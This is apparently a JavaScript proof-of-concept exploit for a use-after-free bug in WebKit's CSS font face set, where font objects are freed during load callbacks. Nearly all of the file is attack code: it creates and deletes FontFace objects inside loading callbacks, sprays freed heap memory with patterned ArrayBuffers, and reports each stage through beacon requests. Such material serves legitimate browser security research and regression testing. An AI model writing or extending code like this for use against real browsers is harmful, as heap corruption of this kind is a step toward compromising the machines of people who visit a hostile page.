// p200a — CSSFontFaceSet std::reference_wrapper UAF
//
// Bug: CSSFontFaceSet::matchingFacesExcludingPreinstalledFonts() returns
// Vector<std::reference_wrapper<CSSFontFace>> — raw unprotected references.
// FontFaceSet::load() holds these across face.get().load() which can trigger
// synchronous status transitions + callbacks. If callbacks cause the CSSFontFace
// to be freed (removed from set while ref count goes to 0), subsequent iterations
// over matchingFaces use dangling pointers.
//
// Upstream fix: changed std::reference_wrapper to Ref<CSSFontFace>
//
// Strategy:
// 1. Create multiple FontFace objects via JS API (document.fonts.add)
// 2. Make some fonts fail synchronously (invalid local() source)
// 3. Use font-display: optional (0s block, 0s swap) for immediate failure
// 4. In load completion, manipulate the font set to trigger UAF
// 5. Spray freed memory with controlled data
//
// Beacon prefix: V200A-

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V200A-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  var NUM_FACES = 20;
  var faces = [];
  var familyBase = 'TestFont';

  // Phase 1: Create many FontFace objects with local() sources that will fail
  for (var i = 0; i < NUM_FACES; i++) {
    try {
      var f = new FontFace(
        familyBase + i,
        'local(NonExistentFont_' + i + '_' + Math.random().toString(36) + ')',
        { display: 'optional' }
      );
      faces.push(f);
      document.fonts.add(f);
    } catch(e) {
      B('ADDERR-' + i + '-' + e.message.substring(0, 30));
    }
  }
  B('ADDED-' + faces.length);

  // Phase 2: Set up load event handler that modifies the font set during callbacks
  var loadCallCount = 0;
  document.fonts.onloadingdone = function(ev) {
    loadCallCount++;
    B('LOADING-DONE-' + loadCallCount + '-' + ev.fontfaces.length);

    // During this callback, remove fonts from the set to trigger ref-count drop
    for (var j = faces.length - 1; j >= 0; j--) {
      try {
        document.fonts.delete(faces[j]);
      } catch(e) {}
    }
    B('DELETED-ALL');

    // Spray freed CSSFontFace memory with ArrayBuffers of known pattern
    var spray = [];
    for (var k = 0; k < 200; k++) {
      var ab = new ArrayBuffer(128);
      var view = new Uint32Array(ab);
      for (var m = 0; m < view.length; m++) view[m] = 0x41414141;
      spray.push(ab);
    }
    B('SPRAYED-' + spray.length);
  };

  document.fonts.onloadingerror = function(ev) {
    B('LOADING-ERR-' + ev.fontfaces.length);
  };

  // Phase 3: Trigger the vulnerability via document.fonts.load()
  // This calls matchingFacesExcludingPreinstalledFonts() which returns raw references,
  // then iterates them calling face.get().load()
  var loadFontSpec = '16px ';
  var allFamilies = [];
  for (var i = 0; i < Math.min(NUM_FACES, 10); i++) {
    allFamilies.push(familyBase + i);
  }
  loadFontSpec += allFamilies.join(', ');

  B('LOADING-' + allFamilies.length);

  try {
    document.fonts.load(loadFontSpec, 'A').then(function(loaded) {
      B('RESOLVED-' + loaded.length);

      // Check if any loaded faces have corrupted state
      for (var i = 0; i < loaded.length; i++) {
        try {
          var st = loaded[i].status;
          var fam = loaded[i].family;
          B('FACE-' + i + '-' + st + '-' + fam.substring(0, 15));
        } catch(e) {
          B('FACE-ERR-' + i + '-' + e.message.substring(0, 30));
        }
      }
    }).catch(function(err) {
      B('REJECTED-' + String(err).substring(0, 40));
    });
  } catch(e) {
    B('LOAD-THROW-' + e.message.substring(0, 40));
  }

  // Phase 4: Also try loading with fonts that have ArrayBuffer source
  // This triggers a different code path through CSSFontFaceSource
  setTimeout(function() {
    B('PHASE4');

    // Create a minimal valid TrueType font in an ArrayBuffer
    // We use a near-empty font to trigger the load->fail path quickly
    var fontData = new ArrayBuffer(64);
    var dv = new DataView(fontData);
    // TrueType header: sfVersion = 0x00010000
    dv.setUint32(0, 0x00010000);
    // numTables = 0 (will cause parse failure)
    dv.setUint16(4, 0);
    dv.setUint16(6, 0);
    dv.setUint16(8, 0);
    dv.setUint16(10, 0);

    var abFaces = [];
    for (var i = 0; i < 30; i++) {
      try {
        var f = new FontFace(
          'ABFont' + i,
          fontData.slice(0),
          { display: 'optional' }
        );
        abFaces.push(f);
        document.fonts.add(f);
      } catch(e) {
        B('AB-ADDERR-' + i);
      }
    }
    B('AB-ADDED-' + abFaces.length);

    // Now trigger load with all AB fonts
    var spec = '16px ' + abFaces.map(function(f, idx) { return 'ABFont' + idx; }).join(', ');

    // Set up handler to delete faces during callback
    var origHandler = document.fonts.onloadingdone;
    document.fonts.onloadingdone = function(ev) {
      B('AB-DONE-' + ev.fontfaces.length);

      // Remove all AB faces during callback
      for (var j = abFaces.length - 1; j >= 0; j--) {
        try { document.fonts.delete(abFaces[j]); } catch(e) {}
      }
      B('AB-DELETED');

      // Heavy spray to fill freed slots
      var bigSpray = [];
      for (var k = 0; k < 500; k++) {
        var ab = new ArrayBuffer(256);
        var v = new Uint32Array(ab);
        for (var m = 0; m < v.length; m++) v[m] = 0x42424242;
        bigSpray.push(ab);
      }
      B('AB-SPRAY-' + bigSpray.length);
    };

    try {
      document.fonts.load(spec, 'B').then(function(loaded) {
        B('AB-RESOLVED-' + loaded.length);
        for (var i = 0; i < loaded.length; i++) {
          try {
            B('AB-FACE-' + i + '-' + loaded[i].status + '-' + loaded[i].family.substring(0, 10));
          } catch(e) {
            B('AB-FACE-ERR-' + i + '-' + e.message.substring(0, 30));
          }
        }
      }).catch(function(err) {
        B('AB-REJECTED-' + String(err).substring(0, 40));
      });
    } catch(e) {
      B('AB-LOAD-THROW-' + e.message.substring(0, 40));
    }
  }, 2000);

  // Phase 5: Aggressive approach — use CSS @font-face + document.fonts.load in tandem
  setTimeout(function() {
    B('PHASE5');

    // Add @font-face via style element
    var style = document.createElement('style');
    style.textContent = '';
    for (var i = 0; i < 20; i++) {
      style.textContent += '@font-face { font-family: "CSSFont' + i + '"; ' +
        'src: local("DEFINITELY_NOT_A_REAL_FONT_' + i + '"); ' +
        'font-display: optional; }\n';
    }
    document.head.appendChild(style);
    B('CSS-ADDED');

    // Force layout to process @font-face rules
    document.body.offsetHeight;

    // Load via document.fonts API — this hits matchingFacesExcludingPreinstalledFonts
    var cssFamilies = [];
    for (var i = 0; i < 20; i++) cssFamilies.push('CSSFont' + i);

    document.fonts.load('16px ' + cssFamilies.join(', '), 'X').then(function(loaded) {
      B('CSS-RESOLVED-' + loaded.length);
    }).catch(function(err) {
      B('CSS-REJECTED-' + String(err).substring(0, 40));
    });

    // Immediately remove the style element to orphan the @font-face rules
    setTimeout(function() {
      document.head.removeChild(style);
      B('CSS-REMOVED');

      // Force GC
      for (var g = 0; g < 10; g++) {
        var junk = [];
        for (var j = 0; j < 20000; j++) junk.push({x: j});
        junk = null;
      }
      B('CSS-GC');
    }, 100);
  }, 5000);

  B('SETUP-DONE');
})();
